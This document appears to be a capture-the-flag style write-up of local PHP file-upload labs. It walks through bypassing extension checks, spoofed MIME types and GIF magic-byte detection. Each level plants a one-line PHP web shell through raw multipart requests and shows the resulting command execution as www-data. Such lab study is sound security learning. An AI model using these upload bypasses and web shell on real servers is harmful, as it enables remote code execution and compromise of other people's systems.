[Level1] Target: http://localhost:12001
     - First, let look at file docker-php.conf
          <FilesMatch ".+\.ph(ar|p|tml)$">
          SetHandler application/x-httpd-php
          </FilesMatch>

          DirectoryIndex disabled
	  DirectoryIndex index.php index.html

	 <LocationMatch ^/upload/$>
   	 Order deny,allow
    	 Deny from all
	 </LocationMatch>
	 
	We can see that it's easy to upload file .phar .php .phtml like a php file 
     - Second, let look at the source code at file index.php
        <?php

    		// Create folder for each user and if it doesn't exist, make a new $dir, and it is in upload folder, followed by the session id
    		session_start();
    		$dir = 'upload/' . session_id();
    		if ( !file_exists($dir) )
      	 	 mkdir($dir);
      	 	 
    		if(isset($_GET["debug"])) die(highlight_file(__FILE__));
    		
    		// If the file is sent, it will be store in /tmp and then move to /var/www/html/upload/{session_id}/{filename}
    		if(isset($_FILES["file"])) {
        		$error = '';
        		$success = '';
        	        try {
            		$file = $dir . "/" . $_FILES["file"]["name"];
            		move_uploaded_file($_FILES["file"]["tmp_name"], $file);
            		
            		// print out the location of the file on the screen 
            		$success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
            		$success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
        		} catch(Exception $e) {
            			$error = $e->getMessage();
        		}
   	        }
 	?>
        That's all what we should see in this file, and no filters in this source code, we can make a simple rce code by php to upload a payload
        
        <?php system($_REQUEST["cmd"]); ?>
        
        You can use $_GET or $_POST, but i rcm you should use $_RESQUEST because it's much more better
        
        You can use BurpSuite to see the session id and the content of the payload
        
        
        Cookie: PHPSESSID=919d8a99d40ba44bcbb67a50997e1d77
	Connection: close

	------WebKitFormBoundaryd8XBGs64tVXFo1uj
	Content-Disposition: form-data; name="file"; filename="payload.php"
	Content-Type: application/x-php

		<?php system($_REQUEST["cmd"]); ?>

	------WebKitFormBoundaryd8XBGs64tVXFo1uj--

	// Because in Dockerfile we know that we are working in /var/www/html
	
	WORKDIR /var/www/html/

	The payload is stored in /var/www/html/upload/919d8a99d40ba44bcbb67a50997e1d77/payload.php
	
	=> FINAL RESULT RCE http://localhost:12001/upload/919d8a99d40ba44bcbb67a50997e1d77/payload.php?cmd=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	
	
[Level 2] Target: http://localhost:12002
	- First, let look at file docker-php.conf and Dockerfile, not thing change, right!
	
	- Let look closely in the index.php file, there is a litle different
	
	      session_start();
	// Somethings different here, The purpose of $_SESSION['dir'] is to store a directory path     
    	if (!isset($_SESSION['dir'])) {
        	$_SESSION['dir'] = 'upload/' . session_id();
   	 }
   	 $dir = $_SESSION['dir'];
   	 
   	 
    	if ( !file_exists($dir) )
     	   mkdir($dir);

    	if(isset($_GET["debug"])) die(highlight_file(__FILE__));
    	if(isset($_FILES["file"])) {
      	  $error = '';
       	  $success = '';
       	  try {
        	    $filename = $_FILES["file"]["name"];
         	   $extension = explode(".", $filename)[1]; // this line will take the second part of file which is the extension like .php or somethings
         	   if ($extension === "php") {
          	      die("Hack detected");
          	  } // yah it block the filename with extension .php
          	  $file = $dir . "/" . $filename;
           	 move_uploaded_file($_FILES["file"]["tmp_name"], $file);
           	 $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
           	 $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
        	} catch(Exception $e) {
        	    $error = $e->getMessage();
       		 }
   	 }
		
	- What can we do in this level, let look at file docker-php.conf
	 
	 <FilesMatch ".+\.ph(ar|p|tml)$">
    	SetHandler application/x-httpd-php
	</FilesMatch>

	DirectoryIndex disabled
	DirectoryIndex index.php index.html

	<LocationMatch ^/upload/$>
 	   Order deny,allow
 	   Deny from all
	</LocationMatch>
	
	// We can use file .phar .phtml to get RCE
	=> We just change the name of file to payload.phar or payload.phtml, it will execute like php file
	=> FINAL RESULT RCE http://localhost:12002/upload/919d8a99d40ba44bcbb67a50997e1d77/payload.phtml?cmd=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	
[Level 3] Target: http://localhost:12003

        This lab is the same to the previous lab, not thing change in the docker-php.conf and Dockerfile file, the index.php file too
        $filename = $_FILES["file"]["name"];
            $extension = end(explode(".", $filename));
            if ($extension === "php") {
                die("Hack detected");
            }
            $file = $dir . "/" . $filename;
        
        // They use end() function, and it will return the last element in array which is the file extension
        
        => We do the same thing with the level 2 to get RCE
        => FINAL RESULT RCE http://localhost:12003/upload/919d8a99d40ba44bcbb67a50997e1d77/payload.phtml?cmd=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	
[Level 4] Target: http://localhost:12004
       I will solve this lab soon -))
[Level 5] Target : http://localhost:12005
       
       -Firstly, this lab allow you to apply images and gif, let look at index.php file
       
       ...
        
        
       $mime_type = $_FILES["file"]["type"];
            if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
                die("Hack detected");
            }
            $file = $dir . "/" . $_FILES["file"]["name"];
       ...
       
       In this case, we dont need to change the extension, we can use burp suite to intercept the resquest
       
       ...
       ------WebKitFormBoundaryd8XBGs64tVXFo1uj
       Content-Disposition: form-data; name="file"; filename="payload.phtml"
            Content-Type: image/gif

            <?php system($_REQUEST["cmd"]); ?>
            
       ------WebKitFormBoundaryd8XBGs64tVXFo1uj--
       
       => FINAL RESULT RCE http://localhost:12005/upload/919d8a99d40ba44bcbb67a50997e1d77/payload.phtml?cmd=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	
[Level 6] Target: http://localhost:12006

	- Just look at index.php file
	
	try {
            $finfo = finfo_open(FILEINFO_MIME_TYPE); // open fileinfo resources
            $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']); 
            //The function reads a portion of the file's contents and matches it against the patterns in the magic database. Based on the best match, it returns the corresponding MIME type.
            $whitelist = array("image/jpeg", "image/png", "image/gif");
            if (!in_array($mime_type, $whitelist, TRUE)) {
                die("Hack detected");
            }
            
         => So, this lab has a litle bit different with the previous lab, change the Content-type is not a correct choice, let change the content of file
         => We know that magic database of "image/gif" is easy to write, so intercept the request and add file signature of gif file like "GIF89a"
         
         ...
       ------WebKitFormBoundaryd8XBGs64tVXFo1uj
       Content-Disposition: form-data; name="file"; filename="payload.phtml"
       Content-Type: application/x-php

       GIF89a
       <?php system($_REQUEST["cmd"]); ?>
            
       ------WebKitFormBoundaryd8XBGs64tVXFo1uj--
       
        => FINAL RESULT RCE http://localhost:12006/upload/919d8a99d40ba44bcbb67a50997e1d77/payload.phtml?cmd=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
 
